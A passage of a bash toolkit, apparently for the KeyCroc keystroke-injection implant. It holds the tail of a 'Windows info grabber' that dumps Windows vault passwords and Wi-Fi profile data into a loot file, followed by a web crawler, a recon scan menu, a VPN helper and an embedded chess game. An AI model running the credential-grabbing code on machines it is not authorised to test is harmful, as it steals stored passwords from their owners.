\"Services:\"\n\"${LINE}\"+ (\$service | out-string)\n\n\"Installed software:\"\n\"${LINE}\"+ (\$software | out-string)\n\n\"Installed drivers:\"\n\"${LINE}\"+ (\$drivers | out-string)\n\n\"Installed videocards:\"\n\"${LINE}\"+ (\$videocard | out-string)\n
\"Windows/user passwords:\"\n\"${LINE}\"\n\$vault | select Resource, UserName, Password | Sort-Object Resource | ft -AutoSize\n\nRemove-Variable -Name computerPubIP,\ncomputerIP,IsDHCPEnabled,Network,Networks,\ncomputerMAC,computerSystem,computerBIOS,computerOs,
computerCpu, computerMainboard,computerRamCapacity,\ncomputerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,\nOutput,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,\nprocess,listener,listenerItem,process,service,software,drivers,videocard,\nvault -ErrorAction SilentlyContinue -Force" >> "$WIN_PS_A"
			sleep 1
			start_win_stat | tee "$LOOT_WIND"
			cat "$LOOT_WIND"
		fi ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
else
	ColorRed "The KeyCroc is not pluged into Windows pc this will not work on this OS $(OS_CHECK)\n"
fi
}
##
#----Web crawler using bash and curl
##
web_crawler() {
	Info_Screen 'Web Crawler
-Crawls a website and prints the URLs of the pages it visits
to the terminal.

A web crawler, also known as a spider, is a program or automated
script that systematically browses the World Wide Web, usually for
the purpose of indexing and gathering information about websites.'
	read_all 'START WEB CRAWLER Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
		user_agent_random
		read_all 'ENTER WEBSITE [https://example.com] AND PRESS [ENTER]' ; base_url="$r_a"
		check_url=$(curl -A "$userAgent" --write-out %{http_code} --silent --output /dev/null $base_url)
		if [ "$check_url" -eq 200 ]; then
			visited=()
			to_visit=("$base_url")
			start_time=$(date +%s)
			total_urls_visited=0
			while [ ${#to_visit[@]} -ne 0 ]; do
				url="${to_visit[0]}"
				unset to_visit[0]
				to_visit=("${to_visit[@]}")
				if [[ "${visited[@]}" =~ "$url" ]]; then
					continue
				fi
				visited+=("$url")
				total_urls_visited=$((total_urls_visited + 1))
				html=$(curl -s -A "$userAgent" "$url")
				if [ $? -ne 0 ]; then
					ColorRed "Error fetching $url\n"
					continue
				fi
				links=$(echo "$html" | grep -oE "href=\"[^\"]+" | cut -d'"' -f2)
				for link in $links; do
					if [[ "$link" =~ "^http" ]]; then
						to_visit+=("$link")
					else
						to_visit+=("$base_url$link")
					fi
				done
				title=$(echo "$html" | grep -oE "<title>[^<]+" | cut -d'>' -f2)
				description=$(echo "$html" | grep -oE "<meta name=\"description\" content=\"[^\"]+" | cut -d'"' -f4)
				response=$(curl -s -I -A "$userAgent" "$url")
				response_code=$(echo "$response" | grep -oE "HTTP/[0-9\.]+ [0-9]+" | cut -d' ' -f2)
				content_type=$(echo "$response" | grep -iE "content-type:.*" | cut -d' ' -f2-)
				last_modified=$(echo "$response" | grep -iE "last-modified:.*" | cut -d' ' -f2-)
				ColorYellow "$total_urls_visited: $(ColorCyan "$url")\n"
				ColorYellow "  Title: $(ColorCyan "$title")\n"
				if [ -n "$description" ]; then
					ColorYellow "  Description: $(ColorCyan "$description")\n"
				fi
				ColorYellow "  Number of links on this page: $(ColorGreen "$(echo "$links" | wc -w)")\n"
				ColorYellow "  Size of this page: $(ColorGreen "$(echo "$html" | wc -c) bytes")\n"
				ColorYellow "  Response code: $(ColorGreen "$response_code")\n"
				if [ -n "$content_type" ]; then
					ColorYellow "  Content type: $(ColorGreen "$content_type")\n"
				fi
				if [ -n "$last_modified" ]; then
					ColorYellow "  Last modified time: $(ColorGreen "$last_modified")\n"
				fi
				current_time=$(date +%s)
				if [ $((current_time - start_time)) -gt 30 ]; then
					ColorRed "No response for 30 seconds, exiting\n"
					break
				fi
			start_time=$(date +%s)
			done
		else
				ColorRed "Website is not accessible"
		fi ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Croc_Pot_Plus Recon scan main menu
##
	MenuTitle 'RECON SCAN MENU'
	MenuColor 21 1 'TCPDUMP SCAN MENU'
	MenuColor 21 2 'NMAP SCAN MENU'
	MenuColor 21 3 'TRACEROUTE SCAN'
	MenuColor 21 4 'WHOIS LOOKUP SCAN'
	MenuColor 21 5 'DNS LOOKUP SCAN'
	MenuColor 21 6 'PING TARGET SCAN'
	MenuColor 21 7 'NETCAT PORT SCAN'
	MenuColor 21 8 'SSL/TLS SSLSCAN'
	MenuColor 21 9 'PHONE NUMBER LOOKUP'
	MenuColor 20 10 'DNS LEAK TEST'
	MenuColor 20 11 'PENTMENU RECON MENU'
	MenuColor 20 12 'WINDOWS INFO GRABBER'
	MenuColor 20 13 'WEB CRAWLER'
	MenuColor 20 14 'RETURN TO MAIN MENU'
	MenuEnd 20
	case "$m_a" in
		1) tcpdump_scan ; croc_recon ;;
		2) nmap_menu ; croc_recon ;;
		3) traceroute_scan ; croc_recon ;;
		4) whois_scan ; croc_recon ;;
		5) dns_scan ; croc_recon ;;
		6) target_ping ; croc_recon ;;
		7) target_port ; croc_recon ;;
		8) ssl_scan ; croc_recon ;;
		9) phone_lookup ; croc_recon ;;
		10) leak_dns ; croc_recon ;;
		11) pentmenu ;;
		12) windows_check ; croc_recon ;;
		13) web_crawler ; croc_recon ;;
		14) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; croc_recon ;;
		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; croc_recon ;;
	esac
}
##
#----VPN SETUP-Start/stop Function
##
function croc_vpn() {
	local vpn_file_A="/etc/openvpn/*.ovpn"
	local vpn_file="/root/udisk/*.ovpn"
	Info_Screen '-First need to download the filename.ovpn file
-From your VPN server of choice
-Place it on the keycroc root of the udisk
-Then select #1 VPN SETUP to do the rest
-Check to see if openvpn is installed'
setup_vpn() {
##
#----VPN Check/install openvpn
##
	install_package openvpn OPENVPN
##
#----VPN user input credentials
##
	if [ -f "$vpn_file" ]; then
		ColorYellow 'FOUND .ovpn FILE MOVING IT TO ect/openvpn\n'
		find . -name *.ovpn -exec mv '{}' "/etc/openvpn/" ";"
		touch /etc/openvpn/credentials
		read_all 'ENTER YOUR USER NAME AND PRESS [ENTER]' ; echo "$r_a" >> /etc/openvpn/credentials
		user_input_passwd /etc/openvpn/credentials VPN
		sed -i 's/auth-user-pass/auth-user-pass \/etc\/openvpn\/credentials/g' "$vpn_file_A"
		openvpn --config "$vpn_file_A" --daemon
	else
		ColorRed 'DID NOT FIND .ovpn FILE ON THE KEYCROC UDISK\n'
	fi
}
##
#----VPN Menu
##
	MenuTitle 'VPN MENU'
	MenuColor 19 1 'VPN SETUP'
	MenuColor 19 2 'ENABLE VPN'
	MenuColor 19 3 'DISABLE VPN'
	MenuColor 19 4 'VPN STATUS'
	MenuColor 19 5 'EDIT .OVPN FILE'
	MenuColor 19 6 'REMOVE VPN FILES'
	MenuColor 19 7 'RETURN TO MAIN MENU'
	MenuEnd 18
	case "$m_a" in
		1) setup_vpn ; croc_vpn ;;
		2) openvpn --config "$vpn_file_A" --daemon ; ColorGreen 'ENABLE VPN CHECK VPN STATUS\n' ; croc_vpn ;;
		3) killall openvpn ; service openvpn restart ; ColorRed 'DISABLE VPN CHECK VPN STATUS\n' ; croc_vpn ;;
		4) route -n ; ifconfig ; ip route show ; systemctl status openvpn* ; croc_vpn ;;
		5) nano "$vpn_file_A" ; croc_vpn ;;
		6) rm -f "$vpn_file_A" /etc/openvpn/credentials "$vpn_file" ; ColorRed '.OVPN AND CREDENTIALS FILES HAS BEEN REMOVED\n' ; croc_vpn ;;
		7) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; croc_vpn ;;
		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; croc_vpn ;;
	esac
}
##
#----Croc Pot Plus Pass time/games
##
function pass_time() {
	Info_Screen '-AUTHOR:
-Bernhard Heinloth bernhard@heinloth.net CHESS
-Kirill Timofeev kt97679@gmail.com TETRIS
-BruXy Bruchanov http://bruxy.regnet.cz SNAKE
-Victor Hugo victorhundo MATRIX
-Thought I would share
-Show the power of the keycroc and bash scripting'
##
#----Pass time Chess
##
chess_game() {
# Chess Bash
# a simple chess game written in an inappropriate language :)
# Copyright (c) 2015 by Bernhard Heinloth <bernhard@heinloth.net>
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
# Default values
	local strength=3
	local namePlayerA="Player"
	local namePlayerB="AI"
	local color=true
	local colorPlayerA=4
	local colorPlayerB=1
	local colorHover=4
	local colorHelper=true
	local colorFill=true
	local ascii=false
	local warnings=false
	local computer=-1
	local mouse=true
	local guiconfig=false
	local cursor=true
	local sleep=2
	local cache=""
	local cachecompress=false
	local unicodelabels=true
	local port=12433
	# internal values
	local timestamp=$( date +%s%N )
	local fifopipeprefix="/tmp/chessbashpipe"
	local selectedX=-1
	local selectedY=-1
	local selectedNewX=-1
	local selectedNewY=-1
	local remote=0
	local remoteip=127.0.0.1
	local remotedelay=0.1
	local remotekeyword="remote"
	local aikeyword="ai"
	local aiPlayerA="Marvin"
	local aiPlayerB="R2D2"
	local A=-1
	local B=1
	local originY=4
	local originX=7
	local hoverX=0
	local hoverY=0
	local hoverInit=false
	local labelX=-2
	local labelY=9
	type stty >/dev/null 2>&1 && useStty=true || useStty=false
	# Choose unused color for hover
	while (( colorHover == colorPlayerA || colorHover == colorPlayerB )); do
		(( colorHover++ ))
	done
	# Check Unicode availbility
	# We do this using a trick: printing a special zero-length unicode char (http://en.wikipedia.org/wiki/Combining_Grapheme_Joiner) and retrieving the cursor position afterwards.
	# If the cursor position is at beginning, the terminal knows unicode. Otherwise it has printed some replacement character.
	echo -en "\e7\e[s\e[H\r\xcd\x8f\e[6n" && read -sN6 -t0.1 x
	if [[ "${x:4:1}" == "1" ]]; then
		ascii=false
		unicodelabels=true
	else
		ascii=true
		unicodelabels=false
	fi
	echo -e "\e[u\e8\e[2K\r\e[0m\nWelcome to \e[1mChessBa.sh\e[0m - a Chess game written in Bash \e[2mby Bernhard Heinloth, 2015\e[0m\n"
	# Print version information
	function version() {
			echo "ChessBash 0.4"
	}
	# Wait for key press
	# no params/return
	function anyKey() {
		$useStty && stty echo
		echo -e "\e[2m(Press any key to continue)\e[0m"
		read -sN1
		$useStty && stty -echo
	}
	# Error message, p.a. on bugs
	# Params:
	#	$1	message
	# (no return value, exit game)
	function error() {
		if "$color"; then
			echo -e "\e[0;1;41m $1 \e[0m\n\e[3m(Script exit)\e[0m" >&2
		else
			echo -e "\e[0;1;7m $1 \e[0m\n\e[3m(Script exit)\e[0m" >&2
		fi
	anyKey
	exit 1
	}
	# Check prerequisits (additional executables)
	# taken from an old script of mine (undertaker-tailor)
	# Params:
	#	$1	name of executable
	function require() {
		type "$1" >/dev/null 2>&1 ||
	{
		echo "This requires $1 but it is not available on your system. Aborting." >&2
		exit 1
	}
	}
	# Validate a number string
	# Params:
	#	$1	String with number
	# Return 0 if valid, 1 otherwise
	function validNumber() {
		if [[ "$1" =~ ^[0-9]+$ ]]; then
			return 0
		else
			return 1
		fi
	}
	# Validate a port string
	# Must be non privileged (>1023)
	# Params:
	#	$1	String with port number
	# Return 0 if valid, 1 otherwise
	function validPort() {
		if validNumber "$1" && (( 1 < 65536 && 1 > 1023 )); then
			return 0
		else
			return 1
		fi
	}
	# Validate an IP v4 or v6 address
	# source: http://stackoverflow.com/a/9221063
	# Params:
	#	$1	IP address to validate
	# Return 0 if valid, 1 otherwise
	function validIP() {
		if [[ "$1" =~ $validate_ip ]]; then
			return 0
		else
			return 1
		fi
	}
	# Named ANSI colors
	declare -a colors=( "black" "red" "green" "yellow" "blue" "magenta" "cyan" "white" )
	# Retrieve ANSI color code from string
	# Black and white are ignored!
	# Params:
	#	$1	Color string
	# Return Color code or 0 if not a valid
	function getColor() {
		local c
		for (( c=1; c<7; c++ )); do
			local v=${colors[$c]:0:1}
			local i=${1:0:1}
			if [[ "${v^^}" == "${i^^}" || "$c" -eq "$i" ]]; then
				return "$c"
			fi
		done
	return 0
}
	# Check if ai player
	# Params:
	#	$1	player
	# Return status code 0 if ai player
	function isAI() {
		if (( $1 < 0 )); then
			if [[ "${namePlayerA,,}" == "${aikeyword,,}" ]]; then
				return 0
			else
				return 1
			fi
		else
			if [[ "${namePlayerB,,}" == "${aikeyword,,}" ]]; then
				return 0
			else
				return 1
			fi
		fi
}
	# Help message
	# Writes text to stdout
function help {
	echo
	echo -e "\e[1mChess Bash\e[0m - a small chess game written in Bash"
	echo
	echo -e "\e[4mUsage:\e[0m $0 [options]"
	echo
	echo -e "\e[4mConfiguration options\e[0m"
	echo "    -g         Use a graphical user interface (instead of more parameters)"
	echo
	echo -e "\e[4mGame options\e[0m"
	echo -e "    -a \e[2mNAME\e[0m    Name of first player, \"$aikeyword\" for computer controlled or the"
	echo "               IP address of remote player (Default: $namePlayerA)"
	echo -e "    -b \e[2mNAME\e[0m    Name of second player, \"$aikeyword\" for computer controlled or"
	echo -e "               \"$remotekeyword\" for another player (Default: \e[2m$namePlayerB\e[0m)"
	echo -e "    -s \e[2mNUMBER\e[0m  Strength of computer (Default: \e[2m$strength\e[0m)"
	echo -e "    -w \e[2mNUMBER\e[0m  Waiting time for messages in seconds (Default: \e[2m$sleep\e[0m)"
	echo
	echo -e "\e[4mNetwork settings for remote gaming\e[0m"
	echo -e "    -P \e[2mNUMBER\e[0m  Set port for network connection (Default: \e[2m$port\e[0m)"
	echo -e "\e[1;33mAttention:\e[0;33m On a network game the person controlling the first player / A"
	echo -e "(using \"\e[2;33m-b $remotekeyword\e[0;33m\" as parameter) must start the game first!\e[0m"
	echo
	echo -e "\e[4mCache management\e[0m"
	echo -e "    -c \e[2mFILE\e[0m    Makes cache permanent - load and store calculated moves"
	echo "    -z         Compress cache file (only to be used with -c, requires gzip)"
	echo -e "    -t \e[2mSTEPS\e[0m   Exit after STEPS ai turns and print time (for benchmark)"
	echo
	echo -e "\e[4mOutput control\e[0m"
	echo "    -h         This help message"
	echo "    -v         Version information"
	echo "    -V         Disable VT100 cursor movement (for partial output changes)"
	echo "    -M         Disable terminal mouse support"
	echo "    -i         Enable verbose input warning messages"
	echo "    -l         Board labels in ASCII (instead of Unicode)"
	echo "    -p         Plain ascii output (instead of cute unicode figures)"
	echo "               This implies ASCII board labels (\"-l\")"
	echo "    -d         Disable colors (only black/white output)"
	echo -e "    \e[4mFollowing options will have no effect while colors are disabled:\e[0m"
	echo -e "    -A \e[2mNUMBER\e[0m  Color code of first player (Default: \e[2m$colorPlayerA\e[0m)"
	echo -e "    -B \e[2mNUMBER\e[0m  Color code of second player (Default: \e[2m$colorPlayerB\e[0m)"
	echo "    -n         Use normal (instead of color filled) figures"
	echo "    -m         Disable color marking of possible moves"
	echo
	echo -e "\e[2m(Default values/options should suit most systems - only if you encounter a"
	echo -e "problem you should have a further investigation of these script parameters."
	echo -e "Or just switch to a real chess game with great graphics and ai! ;)\e[0m"
	echo
}
# Parse command line arguments
	while getopts ":a:A:b:B:c:P:s:t:w:dghilmMnpvVz" options; do
		case $options in
			a)
				if [[ -z "$OPTARG" ]]; then
					echo "No valid name for first player specified!" >&2
					exit 1
				# IPv4 && IPv6 validation, source: http://stackoverflow.com/a/9221063
				elif validIP "$OPTARG"; then
					remote=-1
					remoteip="$OPTARG"
				else
					namePlayerA="$OPTARG"
				fi ;;
			A)
				if ! getColor "$OPTARG"; then
					colorPlayerA=$?
				else
					echo "'$OPTARG' is not a valid color!" >&2
					exit 1
				fi ;;
			b)
				if [[ -z "$OPTARG" ]]; then
					echo "No valid name for second player specified!" >&2
					exit 1
				elif [[ "${OPTARG,,}" == "$remotekeyword" ]]; then
					remote=1
				else
					namePlayerB="$OPTARG"
				fi ;;
			B)
				if ! getColor "$OPTARG"; then
					colorPlayerB=$?
				else
					echo "'$OPTARG' is not a valid color!" >&2
					exit 1
				fi ;;
			s)
				if validNumber "$OPTARG"; then
					strength=$OPTARG
				else
					echo "'$OPTARG' is not a valid strength!" >&2
					exit 1
				fi ;;
			P)
				if validPort "$OPTARG"; then
					port=$OPTARG
				else
					echo "'$OPTARG' is not a valid gaming port!" >&2
					exit 1
				fi ;;
			w)
				if validNumber "$OPTARG"; then
					sleep=$OPTARG
				else
					echo "'$OPTARG' is not a valid waiting time!" >&2
					exit 1
				fi ;;
			c)
				if [[ -z "$OPTARG" ]]; then
					echo "No valid path for cache file!" >&2
					exit 1
				else
					cache="$OPTARG"
				fi ;;
			t)
				if validNumber "$OPTARG"; then
					computer=$OPTARG
				else
					echo "'$OPTARG' is not a valid number for steps!" >&2
					exit 1
				fi ;;
			d) color=false ;;
			g) guiconfig=true ;;
			l) unicodelabels=false ;;
			n) colorFill=false ;;
			m) colorHelper=false ;;
			M) mouse=false ;;
			p) ascii=true ; unicodelabels=false ;;
			i) warnings=true ;;
			v) version ;;
			V) cursor=false ;;
			z) require gzip ; require zcat ; cachecompress=true ;;
			h) help exit 0 ;; \?) echo "Invalid option: -$OPTARG" >&2 ;;
		esac
	done
	# get terminal dimension
	echo -en '\e[18t'
	if read -d "t" -s -t 1 tmp; then
		termDim=(${tmp//;/ })
		termHeight=${termDim[1]}
		termWidth=${termDim[2]}
	else
		termHeight=24
		termWidth=80
	fi
	# gui config
	if "$guiconfig"; then
		# find a dialog system
		if type gdialog >/dev/null 2>&1; then
			dlgtool="gdialog"
			dlgh=0
			dlgw=100
		elif type dialog >/dev/null 2>&1; then
			dlgtool="dialog"
			dlgh=0
			dlgw=0
		elif type whiptail >/dev/null 2>&1; then
			dlgtool="whiptail"
			dlgh=0
			dlgw=$(( termWidth-10 ))
		else
			dlgtool=""
			error "The graphical configuration requires gdialog/zenity, dialog or at least whiptail - but none of them was found on your system. You have to use the arguments to configure the game unless you install one of the required tools..."
		fi
		# Output the type of the first player in a readable string
	function typeOfPlayerA() {
		if [[ "$remote" -eq "-1" ]]; then
			echo "Connect to $remoteip (Port $port)"
			return 2
		elif isAI $A; then
			echo "Artificial Intelligence (with strength $strength)"
			return 1
		else
			echo "Human named $namePlayerA"
			return 0
		fi
}
	# Output the type of the second player in a readable string
	function typeOfPlayerB() {
	if [[ "$remote" -eq "1" ]]; then
		echo "Host server at port $port"
		return 2
	elif isAI $B; then
		echo "Artificial Intelligence (with strength $strength)"
		return 1
	else
		echo "Human named $namePlayerB"
		return 0
	fi
}
	# Execute a dialog
	# Params: Dialog params (variable length)
	# Prints: Dialog output seperated by new lines
	# Returns the dialog program return or 255 if no dialog tool available
	function dlg() {
		if [[ -n "$dlgtool" ]]; then
			$dlgtool --backtitle "ChessBash" "$@" 3>&1 1>&2 2>&3 | sed -e "s/|/\n/g" | sort -u
			return "${PIPESTATUS[0]}"
		else
			return 255
		fi
}
	# Print a message box with a warning/error message
	# Params:
	#	$1	Message
	function dlgerror() {
		#TODO: normal error
		dlg --msgbox "$1" $dlgh $dlgw
}
	# Start the dialog configuration
	# Neither params nor return, this is just a function for hiding local variables!
	function dlgconfig() {
		local option_mainmenu_playerA="First Player"
		local option_mainmenu_playerB="Second Player"
		local option_mainmenu_settings="Game settings"
		local dlg_on="ON"
		local dlg_off="OFF"
		declare -a option_player=( "Human" "Computer" "Network" )
		declare -a option_settings=( "Color support" "Unicode support" "Verbose Messages" "Mouse support" "AI Cache" )
		local dlg_main
		while dlg_main=$(dlg --ok-button "Edit" --cancel-button "Start Game" --menu "New Game" $dlgh $dlgw 0 "$option_mainmenu_playerA" "$(typeOfPlayerA || true)" "$option_mainmenu_playerB" "$(typeOfPlayerB || true )" "$option_mainmenu_settings" "Color, Unicode, Mouse & AI Cache"); do
			case "$dlg_main" in
				# Player A settings
				"$option_mainmenu_playerA" )
					typeOfPlayerA > /dev/null
					local type=$?
					local dlg_player
					dlg_player=$(dlg --nocancel --default-item "${option_player[$type]}" --menu "$option_mainmenu_playerA" $dlgh $dlgw 0 "${option_player[0]}" "$( isAI $A && echo "$option_mainmenu_playerA" || echo "$namePlayerA" )" "${option_player[1]}" "with AI (of strength $strength)" "${option_player[2]}" "Connect to Server $remoteip" )
						case "$dlg_player" in
							# Human --> get Name
							*"${option_player[0]}"* )
							[[ "$remote" -eq "-1" ]] && remote=0
							local dlg_namePlayer
							dlg_namePlayer=$(dlg --inputbox "Name of $option_mainmenu_playerA" $dlgh $dlgw "$( isAI $A && echo "$option_mainmenu_playerA" || echo "$namePlayerA" )") && namePlayerA="$dlg_namePlayer"
							;;
							# Computer --> get Strength
							*"${option_player[1]}"* )
								[[ "$remote" -eq "-1" ]] && remote=0
									namePlayerA=$aikeyword
									local dlg_strength
									if dlg_strength=$(dlg --inputbox "Strength of Computer" $dlgh $dlgw  "$strength"); then
										if validNumber "$dlg_strength"; then
											strength=$dlg_strength
										else
											dlgerror "Your input '$dlg_strength' is not a valid number!"
										fi
									fi ;;
							# Network --> get Server and Port
							*"${option_player[2]}"* )
								local dlg_remoteip
								if dlg_remoteip=$(dlg --inputbox "IP(v4 or v6) address of Server" $dlgh $dlgw "$remoteip"); then
									if validIP "$dlg_remoteip"; then
										remote=-1
										remoteip="$dlg_remoteip"
										local dlg_networkport
											if dlg_networkport=$(dlg --inputbox "Server Port (non privileged)" $dlgh $dlgw "$port"); then
												if validPort "$dlg_networkport"; then
													port=$dlg_networkport
												else
													dlgerror "Your input '$dlg_remoteip' is not a valid Port!"
												fi
											fi
									else
										dlgerror "Your input '$dlg_remoteip' is no valid IP address!"
										continue
									fi
								fi ;;
						esac
			# Player color
			if $color; then
				local colorlist=""
				local c
				for (( c=1; c<7; c++ )); do
					colorlist+=" ${colors[$c]^} figures"
				done
				local dlg_player_color
				if dlg_player_color=$(dlg --nocancel --default-item "${colors[$colorPlayerA]^}" --menu "Color of $option_mainmenu_playerA" $dlgh $dlgw 0 "$colorlist"); then
					getColor "$dlg_player_color" || colorPlayerA=$?
				fi
			fi ;;
							# Player B settings
							"$option_mainmenu_playerB" )
								typeOfPlayerB > /dev/null
								local type=$?
								local dlg_player
								dlg_player=$(dlg --nocancel --default-item "${option_player[$type]}" --menu "$option_mainmenu_playerB" $dlgh $dlgw 0 "${option_player[0]}" "$( isAI $B && echo "$option_mainmenu_playerB" || echo "$namePlayerB" )" "${option_player[1]}" "with AI (of strength $strength)" "${option_player[2]}" "Wait for connections on port $port" )
									case "$dlg_player" in
										# Human --> get Name
										*"${option_player[0]}"* )
											[[ "$remote" -eq "1" ]] && remote=0
											local dlg_namePlayer
											dlg_namePlayer=$(dlg --inputbox "Name of $option_mainmenu_playerB" $dlgh $dlgw "$( isAI $B && echo "$option_mainmenu_playerB" || echo "$namePlayerB" )") && namePlayerA="$dlg_namePlayer" ;;
										# Computer --> get Strength
										*"${option_player[1]}"* )
											[[ "$remote" -eq "1" ]] && remote=0
											namePlayerB=$aikeyword
											local dlg_strength
											if dlg_strength=$(dlg --inputbox "Strength of Computer" $dlgh $dlgw  "$strength"); then
												if validNumber "$dlg_strength"; then
													strength=$dlg_strength
												else
													dlgerror "Your input '$dlg_strength' is not a valid number!"
												fi
											fi ;;
										# Network --> get Server and Port
										*"${option_player[2]}"* )
											remote=1
											local dlg_networkport
												if dlg_networkport=$(dlg --inputbox "Server Port (non privileged)" $dlgh $dlgw "$port"); then
													if validPort "$dlg_networkport"; then
														port=$dlg_networkport
													else
														dlgerror "Your input '$dlg_remoteip' is not a valid Port!"
													fi
												fi ;;
									esac
	# Player color
	if $color; then
		local colorlist=""
		local c
		for (( c=1; c<7; c++ )); do
			colorlist+=" ${colors[$c]^} figures"
		done
		local dlg_player_color
		if dlg_player_color=$(dlg --nocancel --default-item "${colors[$colorPlayerB]^}" --menu "Color of $option_mainmenu_playerB" $dlgh $dlgw 0 "$colorlist"); then
			getColor "$dlg_player_color" || colorPlayerB=$?
		fi
	fi ;;
				# Game settings
				"$option_mainmenu_settings" )
					if dlg_settings=$(dlg --separate-output --checklist "$option_mainmenu_settings" $dlgh $dlgw $dlgw "${option_settings[0]}" "with movements and figures" $($color && echo $dlg_on || echo $dlg_off) "${option_settings[1]}" "optional including board labels" $($ascii && echo $dlg_off || echo $dlg_on) "${option_settings[2]}" "be chatty" $($warnings && echo $dlg_on || echo $dlg_off) "${option_settings[3]}" "be clicky" $($mouse && echo $dlg_on || echo $dlg_off) "${option_settings[4]}" "in a regluar file" $([[ -n "$cache" ]] && echo $dlg_on || echo $dlg_off) ); then
					# Color support
						if [[ "$dlg_settings" == *"${option_settings[0]}"* ]]; then
							color=true
							dlg --yesno "Enable movement helper (colorize possible move)?" $dlgh $dlgw && colorHelper=true || colorHelper=false
							dlg --yesno "Use filled (instead of outlined) figures for both player?" $dlgh $dlgw && colorFill=true || colorFill=false
						else
							color=false
							colorFill=false
							colorHelper=false
						fi
						# Unicode support
						if [[ "$dlg_settings" == *"${option_settings[1]}"* ]]; then
							ascii=false
							( dlg --yesno "Use Unicode for board labels?" $dlgh $dlgw ) && unicodelabels=true || unicodelabels=false
						else
							ascii=true
							unicodelabels=false
						fi
						# Verbose messages
						[[ "$dlg_settings" == *"${option_settings[2]}"* ]] && warnings=true || warnings=false
						# Mouse support
						[[ "$dlg_settings" == *"${option_settings[3]}"* ]] && mouse=true || mouse=false
						# AI Cache
						local dlg_cache
						if [[ "$dlg_settings" == *"${option_settings[4]}"* ]] && dlg_cache=$(dlg --inputbox "Cache file:" $dlgh $dlgw "$([[ -z "$cache" ]] && echo "$(pwd)/chessbash.cache" || echo "$cache")") && [[ -n "$dlg_cache" ]]; then
							cache="$dlg_cache"
							type gzip >/dev/null 2>&1 && type zcat >/dev/null 2>&1 && dlg --yesno "Use GZip compression for Cache?" $dlgh $dlgw && cachecompress=true || cachecompress=false
						else
							cache=""
						fi
						# Waiting time (ask always)
						local dlg_sleep
						if dlg_sleep=$(dlg --inputbox "How long should every message be displayed (in seconds)?" $dlgh $dlgw "$sleep"); then
							if validNumber "$dlg_sleep"; then
								sleep=$dlg_sleep
							else
								dlgerror "Your input '$dlg_sleep' is not a valid number!"
							fi
						fi
					fi ;;
			# Other --> exit (gdialog)
			* )
				break ;;
			esac
		done
	}
	# start config dialog
	dlgconfig
	fi
	# Save screen
if $cursor; then
		echo -e "\e7\e[s\e[?47h\e[?25l\e[2J\e[H"
fi
# lookup tables
declare -A cacheLookup
declare -A cacheFlag
declare -A cacheDepth
	# associative arrays are faster than numeric ones and way more readable
	declare -A redraw
	if $cursor; then
		for (( y=0; y<10; y++ )); do
			for (( x=-2; x<8; x++ )); do
				redraw[$y,$x]=""
			done
		done
	fi
declare -A field
	# initialize setting - first row
	declare -a initline=( 4  2  3  6  5  3  2  4 )
	for (( x=0; x<8; x++ )); do
		field[0,$x]=${initline[$x]}
		field[7,$x]=$(( (-1) * ${initline[$x]} ))
	done
	# set pawns
	for (( x=0; x<8; x++ )); do
		field[1,$x]=1
		field[6,$x]=-1
	done
# set empty fields
	for (( y=2; y<6; y++ )); do
		for (( x=0; x<8; x++ )); do
			field[$y,$x]=0
		done
	done
# readable figure names
declare -a figNames=( "(empty)" "pawn" "knight" "bishop" "rook" "queen" "king" )
# ascii figure names (for ascii output)
declare -a asciiNames=( "k" "q" "r" "b" "n" "p" " " "P" "N" "B" "R" "Q" "K" )
# figure weight (for heuristic)
declare -a figValues=( 0 1 5 5 6 17 42 )
# Warning message on invalid moves (Helper)
# Params:
#	$1	message
# (no return value)
function warn() {
	message="\e[41m\e[1m$1\e[0m\n"
	draw
}
# Readable coordinates
# Params:
#	$1	row position
#	$2	column position
# Writes coordinates to stdout
function coord() {
	echo -en "\x$((48-$1))$(($2+1))"
}
# Get name of player
# Params:
#	$1	player
# Writes name to stdout
function namePlayer() {
	if (( $1 < 0 )); then
		if $color; then
			echo -en "\e[3${colorPlayerA}m"
		fi
		if isAI "$1"; then
			echo -n "$aiPlayerA"
		else
			echo -n "$namePlayerA"
		fi
	else
		if $color; then
			echo -en "\e[3${colorPlayerB}m"
		fi
		if isAI "$1"; then
			echo -n "$aiPlayerB"
		else
			echo -n "$namePlayerB"
		fi
	fi
if $color; then
	echo -en "\e[0m"
fi
}
# Get name of figure
# Params:
#	$1	figure
# Writes name to stdout
function nameFigure() {
	if (( $1 < 0 )); then
		echo -n "${figNames[$1*(-1)]}"
	else
		echo -n "${figNames[$1]}"
	fi
}
# Check win/loose position
# (player has king?)
# Params:
#	$1	player
# Return status code 1 if no king
function hasKing() {
local player=$1;
local x
local y
for (( y=0;y<8;y++ )); do
	for (( x=0;x<8;x++ )); do
		if (( ${field[$y,$x]} * player == 6 )); then
		return 0
		fi
	done
done
return 1
}
# Check validity of a concrete single movement
# Params:
#	$1	origin Y position
#	$2	origin X position
#	$3	target Y position
#	$4	target X position
#	$5	current player
# Returns status code 0 if move is valid
function canMove() {
	local fromY=$1
	local fromX=$2
	local toY=$3
	local toX=$4
	local player=$5
	local i
	if (( fromY < 0 || fromY >= 8 || fromX < 0 || fromX >= 8 || toY < 0 || toY >= 8 || toX < 0 || toX >= 8 || ( fromY == toY && fromX == toX ) )); then
		return 1
	fi
	local from=${field[$fromY,$fromX]}
	local to=${field[$toY,$toX]}
	local fig=$(( from * player ))
	if (( from == 0 || from * player < 0 || to * player > 0 || player * player != 1 )); then
		return 1
# pawn
elif (( fig == 1 )); then
